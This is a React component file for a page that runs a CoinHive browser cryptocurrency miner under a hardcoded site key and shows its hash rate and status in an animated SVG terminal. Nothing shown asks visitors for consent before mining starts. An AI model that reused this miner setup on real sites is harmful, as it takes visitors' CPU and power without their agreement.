import React, { Component } from 'react'

// Library
import ClientInfo from './lib/clientInfo'
import Runner from './lib/Runner'

// Components
import Stage from './components/Stage'
import Terminal from './components/Terminal'
import Cars from './components/Cars'
import CoinHive from './components/CoinHive'
import { onShare } from './components/Share'
import { Buttonz } from './styles/buttons'

// Styles
import styled from 'styled-components'

const Containerz = styled.div`
  text-align: center
`
class App extends Component {
  constructor (props) {
    super(props)

    this._frameId = null

    this.client = new ClientInfo().getData()
    this.hps = 0
    this._hps = 0

    this.state = {
      status: `INIT`
    }
  }

  onInit = miner => {
    setInterval(
      () =>
        miner &&
        this.onMining({
          hashesPerSecond: miner.getHashesPerSecond(),
          totalHashes: miner.getTotalHashes(),
          acceptedHashes: miner.getAcceptedHashes()
        }),
      1000
    )
  }

  onMining = ({ hashesPerSecond = 0, totalHashes = 0, acceptedHashes = 0 }) => {
    this.hps = hashesPerSecond
    this.terminal.update(`⛏ Mining...${Number(this.hps).toPrecision(8)}`)
  }

  onFound = () => this.terminal.update('💎 Found!')
  onAccepted = () => this.terminal.update('💵 Accepted!')
  onError = err => this.terminal.update(`🔥 Error! ${err}`)

  componentDidMount = () => {
    this.svg = document.getElementById('svg')

    // Terminal
    this.terminal = new Terminal(this.svg)
    this.terminal.update('⚡ Initializing...')

    // Gimmick
    this.cars = new Cars(this.svg)

    // Runner
    this.runner = new Runner(this.onRun)
    this.runner.startLoop()
  }

  componentWillUnmount = () => this.runner.stopLoop()

  onRun = () => {
    // Move car
    this.cars.update()

    // HPS
    const hps = this.svg.querySelector('g text#hps')
    this._hps += (this.hps - this._hps) / 8
    hps.innerHTML = Number(this._hps).toPrecision(4)
  }

  render () {
    return (
      <Containerz>
        <Containerz>
          <Stage client={this.client} />
          <CoinHive
            status={this.state.status}
            siteKey='QCLjDlh3Kllh2aj3P0cW6as65eZH3oeK'
            onInit={miner => this.onInit(miner)}
            onFound={() => this.onFound()}
            onAccepted={() => this.onAccepted()}
            onError={err => this.onError(err)}
          />
        </Containerz>
        <Buttonz onClick={() => onShare(this.svg)}>
          SHARE
        </Buttonz>
        <div style={{ width: 0, height: 0, overflow: 'hidden' }}><canvas id='canvas' width='640' height='640' /></div>
      </Containerz>
    )
  }
}

export default App
